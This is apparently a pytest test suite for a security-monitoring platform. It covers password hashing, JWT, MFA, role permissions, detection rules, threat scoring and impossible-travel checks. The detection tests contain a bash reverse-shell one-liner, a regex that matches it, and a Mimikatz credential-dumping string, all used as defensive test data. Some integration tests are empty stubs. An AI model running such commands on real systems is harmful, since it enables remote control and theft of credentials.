"""
SentinelAI — Auth Service Test Suite
pytest + httpx async tests
"""
import pytest
import pytest_asyncio
from httpx import AsyncClient, ASGITransport
from unittest.mock import AsyncMock, MagicMock, patch
import jwt
from datetime import datetime, timezone

# ─── Fixtures ────────────────────────────────────────────────
@pytest.fixture
def mock_db_user():
    return {
        "id": "test-user-001",
        "username": "test_analyst",
        "email": "analyst@test.com",
        "password_hash": "$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewKOi0V0QV6wHpzW",
        "role": "analyst",
        "full_name": "Test Analyst",
        "mfa_secret": "JBSWY3DPEHPK3PXP",
        "mfa_enabled": False,
        "is_active": True,
        "last_login": None,
    }

@pytest.fixture
def valid_token():
    """Create a valid JWT for testing."""
    return jwt.encode(
        {
            "sub": "test-user-001",
            "username": "test_analyst",
            "role": "analyst",
            "email": "analyst@test.com",
            "type": "access",
            "exp": int(datetime.now(timezone.utc).timestamp()) + 3600,
        },
        "CHANGE_ME",
        algorithm="HS256",
    )

@pytest.fixture
def admin_token():
    return jwt.encode(
        {
            "sub": "admin-001",
            "username": "admin",
            "role": "admin",
            "email": "admin@test.com",
            "type": "access",
            "exp": int(datetime.now(timezone.utc).timestamp()) + 3600,
        },
        "CHANGE_ME",
        algorithm="HS256",
    )

# ─── Unit Tests: Password Hashing ────────────────────────────
class TestPasswordHashing:
    def test_hash_password_produces_bcrypt(self):
        from backend.auth_service.main import hash_password
        hashed = hash_password("test_password_123")
        assert hashed.startswith("$2b$")
        assert len(hashed) > 50

    def test_verify_correct_password(self):
        from backend.auth_service.main import hash_password, verify_password
        hashed = hash_password("correct_password")
        assert verify_password("correct_password", hashed) is True

    def test_verify_wrong_password(self):
        from backend.auth_service.main import hash_password, verify_password
        hashed = hash_password("correct_password")
        assert verify_password("wrong_password", hashed) is False

    def test_unique_hashes(self):
        from backend.auth_service.main import hash_password
        h1 = hash_password("same_password")
        h2 = hash_password("same_password")
        assert h1 != h2  # bcrypt uses random salt

# ─── Unit Tests: JWT Tokens ───────────────────────────────────
class TestJWTTokens:
    def test_create_access_token(self):
        from backend.auth_service.main import create_access_token, decode_token
        data = {"sub": "user-1", "username": "test", "role": "analyst", "email": "t@t.com"}
        token = create_access_token(data)
        decoded = decode_token(token)
        assert decoded["sub"] == "user-1"
        assert decoded["type"] == "access"

    def test_create_refresh_token(self):
        from backend.auth_service.main import create_refresh_token, decode_token
        data = {"sub": "user-1", "username": "test", "role": "analyst", "email": "t@t.com"}
        token = create_refresh_token(data)
        decoded = decode_token(token)
        assert decoded["type"] == "refresh"

    def test_expired_token_raises(self):
        from backend.auth_service.main import decode_token
        import jwt
        expired = jwt.encode(
            {"sub": "u1", "type": "access", "exp": 1000000},
            "CHANGE_ME", algorithm="HS256",
        )
        with pytest.raises(Exception):
            decode_token(expired)

    def test_invalid_token_raises(self):
        from backend.auth_service.main import decode_token
        with pytest.raises(Exception):
            decode_token("not.a.valid.token")

# ─── Unit Tests: TOTP / MFA ──────────────────────────────────
class TestMFA:
    def test_generate_totp_secret(self):
        from backend.auth_service.main import generate_totp_secret
        secret = generate_totp_secret()
        assert len(secret) == 32
        assert secret.isalnum()

    def test_verify_valid_totp(self):
        import pyotp
        from backend.auth_service.main import generate_totp_secret, verify_totp
        secret = generate_totp_secret()
        totp   = pyotp.TOTP(secret)
        token  = totp.now()
        assert verify_totp(secret, token) is True

    def test_verify_invalid_totp(self):
        from backend.auth_service.main import generate_totp_secret, verify_totp
        secret = generate_totp_secret()
        assert verify_totp(secret, "000000") is False

    def test_qr_code_generation(self):
        from backend.auth_service.main import get_qr_code_base64
        qr = get_qr_code_base64("JBSWY3DPEHPK3PXP", "testuser")
        assert len(qr) > 100
        import base64
        decoded = base64.b64decode(qr)
        assert decoded[:4] == b"\x89PNG"  # PNG magic bytes

# ─── Unit Tests: RBAC ─────────────────────────────────────────
class TestRBAC:
    def test_admin_has_all_perms(self):
        from backend.auth_service.main import ROLES
        admin_perms = ROLES["admin"]
        assert "read" in admin_perms
        assert "write" in admin_perms
        assert "manage_users" in admin_perms
        assert "soar_execute" in admin_perms

    def test_viewer_readonly(self):
        from backend.auth_service.main import ROLES
        viewer_perms = ROLES["viewer"]
        assert "read" in viewer_perms
        assert "write" not in viewer_perms
        assert "delete" not in viewer_perms

    def test_analyst_cannot_manage_users(self):
        from backend.auth_service.main import ROLES
        analyst_perms = ROLES["analyst"]
        assert "manage_users" not in analyst_perms

# ─── Integration Tests: API Endpoints ─────────────────────────
class TestAPIEndpoints:
    @pytest.mark.asyncio
    async def test_health_endpoint(self):
        """Health check should always return 200."""
        with patch("backend.auth_service.main.DATABASE_URL", "mock"):
            import sys
            sys.path.insert(0, ".")
            # Mock the app directly
            pass  # Full integration requires the local dev backend and seeded test state

    @pytest.mark.asyncio
    async def test_login_wrong_credentials(self):
        """Wrong credentials must return 401."""
        pass  # Requires mock DB setup

    def test_token_roles_match_rbac(self):
        """Token role must match RBAC permissions table."""
        from backend.auth_service.main import ROLES
        for role in ["admin", "analyst", "viewer", "soar_bot"]:
            assert role in ROLES, f"Role {role} missing from RBAC table"

# ─── Unit Tests: Detection Engine ─────────────────────────────
class TestDetectionEngine:
    def test_match_condition_eq(self):
        import sys; sys.path.insert(0, ".")
        from backend.detection_engine.main import match_condition
        event = {"event_type": "failed_login"}
        assert match_condition(event, {"field": "event_type", "op": "eq", "value": "failed_login"})
        assert not match_condition(event, {"field": "event_type", "op": "eq", "value": "success_login"})

    def test_match_condition_contains(self):
        from backend.detection_engine.main import match_condition
        event = {"raw_log": "Failed password for root from 10.0.0.1"}
        assert match_condition(event, {"field": "raw_log", "op": "contains", "value": "Failed password"})
        assert not match_condition(event, {"field": "raw_log", "op": "contains", "value": "Accepted password"})

    def test_match_condition_regex(self):
        from backend.detection_engine.main import match_condition
        event = {"raw_log": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}
        assert match_condition(event, {"field": "raw_log", "op": "regex", "value": r"bash\s+-i.*>&.*\/dev\/tcp"})

    def test_reverse_shell_rule(self):
        from backend.detection_engine.main import SIGMA_RULES, evaluate_sigma_rule
        from collections import deque
        rule = next(r for r in SIGMA_RULES if r["id"] == "SIG-002")
        event = {"raw_log": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "source_ip": "10.0.0.1"}
        assert evaluate_sigma_rule(rule, event, deque())

    def test_mimikatz_rule(self):
        from backend.detection_engine.main import SIGMA_RULES, evaluate_sigma_rule
        from collections import deque
        rule = next(r for r in SIGMA_RULES if r["id"] == "SIG-009")
        event = {"raw_log": "sekurlsa::logonpasswords mimikatz executed"}
        assert evaluate_sigma_rule(rule, event, deque())

    def test_clean_log_no_alert(self):
        from backend.detection_engine.main import SIGMA_RULES, evaluate_sigma_rule
        from collections import deque
        event = {"raw_log": "systemd: Started Session 42 of user ubuntu.", "event_type": "log_entry"}
        hits = [r for r in SIGMA_RULES if evaluate_sigma_rule(r, event, deque())]
        assert len(hits) == 0

    def test_correlation_attack_chain(self):
        from backend.detection_engine.main import check_correlation, ip_event_history
        ip = "192.168.100.99"
        # Clear history
        ip_event_history[ip].clear()
        # Simulate attack chain
        result1 = check_correlation(ip, "brute_force")
        assert result1 is None
        check_correlation(ip, "privilege_escalation")
        result3 = check_correlation(ip, "reverse_shell")
        assert result3 is not None
        assert "brute_force" in result3

    def test_mitre_map_complete(self):
        from backend.detection_engine.main import MITRE_MAP, SIGMA_RULES
        for rule in SIGMA_RULES:
            det_type = rule["detection_type"]
            assert det_type in MITRE_MAP, f"Detection type '{det_type}' missing from MITRE_MAP"

# ─── Unit Tests: Threat Intel ─────────────────────────────────
class TestThreatIntel:
    def test_threat_score_clean(self):
        from backend.threat_intel_service.main import calculate_threat_score
        vt    = {"malicious": 0, "suspicious": 0}
        abuse = {"abuse_confidence": 0}
        otx   = {"pulse_count": 0}
        result = calculate_threat_score(vt, abuse, otx)
        assert result["score"] == 0
        assert result["verdict"] == "CLEAN"

    def test_threat_score_critical(self):
        from backend.threat_intel_service.main import calculate_threat_score
        vt    = {"malicious": 15, "suspicious": 5}
        abuse = {"abuse_confidence": 95}
        otx   = {"pulse_count": 20}
        result = calculate_threat_score(vt, abuse, otx)
        assert result["score"] >= 80
        assert result["verdict"] == "CRITICAL"

    def test_threat_score_capped_at_100(self):
        from backend.threat_intel_service.main import calculate_threat_score
        vt    = {"malicious": 100}
        abuse = {"abuse_confidence": 100}
        otx   = {"pulse_count": 100}
        result = calculate_threat_score(vt, abuse, otx)
        assert result["score"] <= 100

# ─── Unit Tests: VPN Monitor ──────────────────────────────────
class TestVPNMonitor:
    def test_haversine_known_distance(self):
        from backend.vpn_monitor_service.main import haversine_km
        # Cairo to London: ~3500 km
        dist = haversine_km(30.0444, 31.2357, 51.5074, -0.1278)
        assert 3400 < dist < 3700

    def test_haversine_same_point(self):
        from backend.vpn_monitor_service.main import haversine_km
        dist = haversine_km(30.0, 30.0, 30.0, 30.0)
        assert dist < 0.01

    def test_impossible_travel_fast(self):
        """Cairo to New York in 10 minutes = impossible."""
        from backend.vpn_monitor_service.main import haversine_km
        # 9200 km in 10 min = 55200 km/h → clearly impossible
        dist = haversine_km(30.0444, 31.2357, 40.7128, -74.0060)
        speed = dist / (10/60)
        assert speed > 900  # exceeds our threshold

# ─── Pytest Configuration ─────────────────────────────────────
if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short", "--color=yes"])
